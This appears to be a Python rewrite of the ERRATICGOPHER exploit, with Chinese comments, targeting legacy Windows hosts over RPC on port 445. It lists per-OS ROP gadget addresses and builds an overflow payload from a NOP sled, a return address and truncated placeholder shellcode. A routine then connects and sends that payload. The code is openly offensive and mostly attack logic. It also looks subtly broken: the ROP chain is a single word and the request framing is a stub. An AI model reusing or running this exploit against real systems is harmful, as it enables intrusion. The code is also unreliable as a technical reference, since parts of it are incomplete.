"""erratic_gopher — ERRATICGOPHER RPC 利用核心逻辑。

Python 重写的 `Erraticgopher-1.0.1.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 RPC/NetAPI 利用流程。

参数定义来源：Erraticgopher-1.0.1.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 60
DEFAULT_CONNECTION_DIRECTION = 0  # 0 = Reverse callback

# 各目标 OS 的 ROP gadget 地址（来自 XML <Target><paramgroup>）
TARGET_OS_GADGETS = {
    "XPSP3": {
        "EggOffset":        0xE4,
        "RsaenhBase":       0x68000000,
        "MaxEggSize":       0x0690,
        "LockStackOffset":  0x0190,
        "InitialRetAddr":   0x00014E7A,
        "RwAddress":        0x00032020,
        "ZeroEax":          0x000121DE,
        "MovEspEax":        0x00014F88,
        "StoreEaxEcx":      0x0001137E,
        "SkipJunk":         0x00015EA3,
        "SkipJunkPadding":  0x0000000C,
        "GetVProtIndex":    0x0000A965,
        "vProtIndex":       0x00000089,
        "vProtPadding":     0x0000000C,
        "SetupEbx":         0x00015EA5,
        "SysCallAddr":      0x7FFE0300,
        "JumpEbx":          0x00011740,
        "JumpEbxPadding":   0x00000010,
        "Ret14":            0x0000692D,
        "JumpEsp":          0x00011899,
    },
    "W2K3SP0": {
        "EggOffset":        0x28,
        "RsaenhBase":       0x0,
        "MaxEggSize":       0x06B0,
        "LockStackOffset":  0x0190,
        "InitialRetAddr":   0x0FFEF4C9,
    },
    "W2K3SP1": {
        "EggOffset":        0xC4,
        "RsaenhBase":       0x68000000,
        "MaxEggSize":       0x06B0,
        "LockStackOffset":  0x0170,
        "InitialRetAddr":   0x00015BD8,
        "RwAddress":        0x0002BA08,
        "ZeroEax":          0x00012CE6,
        "MovEspEax":        0x00015CF4,
        "StoreEaxEcx":      0x00011EB9,
        "SkipJunk":         0x00015D8B,
        "GetVProtIndex":    0x000092A1,
        "vProtIndex":       0x0000008F,
        "vProtPadding":     0x00000008,
        "SetupEbx":         0x00015D8D,
        "SysCallAddr":      0x7FFE0300,
        "JumpEbx":          0x0001227B,
        "Ret14":            0x0000694E,
        "JumpEsp":          0x000123D4,
    },
    "W2K3SP2": {
        "EggOffset":        0xC4,
        "RsaenhBase":       0x68000000,
        "MaxEggSize":       0x06B0,
        "LockStackOffset":  0x0170,
        "InitialRetAddr":   0x00015F8B,
        "RwAddress":        0x000312C0,
        "ZeroEax":          0x00012F87,
        "MovEspEax":        0x000160A4,
        "StoreEaxEcx":      0x00011F3D,
        "SkipJunk":         0x000160B6,
        "GetVProtIndex":    0x0000A965,
        "vProtIndex":       0x0000008F,
        "vProtPadding":     0x00000008,
        "SetupEbx":         0x000160B8,
        "SysCallAddr":      0x7FFE0300,
        "JumpEbx":          0x0001229D,
        "Ret14":            0x0000694E,
        "JumpEsp":          0x000123F6,
    },
}

ERRATICGOPHER_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


class ErraticGopherError(Exception):
    pass


def connect(target_ip, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_rpc_bind_request():
    null_uuid = bytes(16)
    abstract = null_uuid + struct.pack("<I", 1)
    transfer = null_uuid + struct.pack("<I", 2)
    ctx_item = struct.pack("<HBB", 0, 1, 0) + abstract + transfer
    bind_body = struct.pack("<HHLBBH", 0x10B8, 0x10B8, 0, 1, 0, 0) + ctx_item
    header = struct.pack("<BBBBIHHI", 5, 0, 0x0B, 0x03, 0x10,
                         16 + len(bind_body), 0, 1)
    return header + bind_body


def build_erratic_gopher_overflow(shellcode, gadgets):
    """构建 ERRATICGOPHER 缓冲区溢出负载。

    根据 x32dbg 分析，ERRATICGOPHER 通过向目标发送特制的 RPC 请求，
    触发缓冲区溢出，利用 ROP 链执行 shellcode。
    """
    offset = gadgets.get("EggOffset", 0xC4)
    nopsled = b"\x90" * offset
    ret_addr = struct.pack("<I", gadgets.get("JumpEsp", 0xDEADBEEF))
    rop_chain = struct.pack("<I", gadgets.get("InitialRetAddr", 0x0))
    return nopsled + ret_addr + rop_chain + shellcode


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    connection_direction=DEFAULT_CONNECTION_DIRECTION,
    target_os="XPSP3",
    callback_ip=None,
    callback_port=None,
    verbose=False,
):
    """执行 ERRATICGOPHER 利用序列。

    阶段：
      1. TCP 连接到目标 RPC 端口
      2. 发送 RPC BIND 请求
      3. 构建并发送 ERRATICGOPHER 缓冲区溢出负载 (ROP + shellcode)
      4. 载荷投递（Callback）
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Connection direction: {connection_direction}")
        print(f"[*] Target OS: {target_os}")
        print(f"[*] Callback IP: {callback_ip}")
        print(f"[*] Callback port: {callback_port}")

    gadgets = TARGET_OS_GADGETS.get(target_os, TARGET_OS_GADGETS["XPSP3"])

    if verbose:
        print(f"[*] EggOffset: 0x{gadgets.get('EggOffset', 0):03X}")
        print(f"[*] RsaenhBase: 0x{gadgets.get('RsaenhBase', 0):08X}")
        print(f"[*] InitialRetAddr: 0x{gadgets.get('InitialRetAddr', 0):08X}")
        print(f"[*] JumpEsp: 0x{gadgets.get('JumpEsp', 0):08X}")

    # 建立 TCP 连接（RPC 445）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise ErraticGopherError(f"无法连接到 {target}:{port}: {exc}") from exc

    try:
        # 发送 RPC BIND 请求（探测阶段）
        bind_request = build_rpc_bind_request()
        sock.sendall(bind_request)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] RPC BIND 应答: {resp.hex()[:128] if resp else '无'}")

        if not resp:
            raise ErraticGopherError("目标未返回有效的 RPC 应答")

        # 构建 ERRATICGOPHER 缓冲区溢出负载
        shellcode = ERRATICGOPHER_SHELLCODE_PLACEHOLDER
        overflow = build_erratic_gopher_overflow(shellcode, gadgets)
        if verbose:
            print(f"[+] 溢出负载: {len(overflow)} 字节")

        # 发送溢出负载
        sock.sendall(overflow)
        try:
            resp2 = sock.recv(4096)
            if verbose:
                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
        except OSError:
            if verbose:
                print("[*] 目标连接已关闭（可能已触发溢出）")

        if verbose:
            print("[+] ERRATICGOPHER 利用序列完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
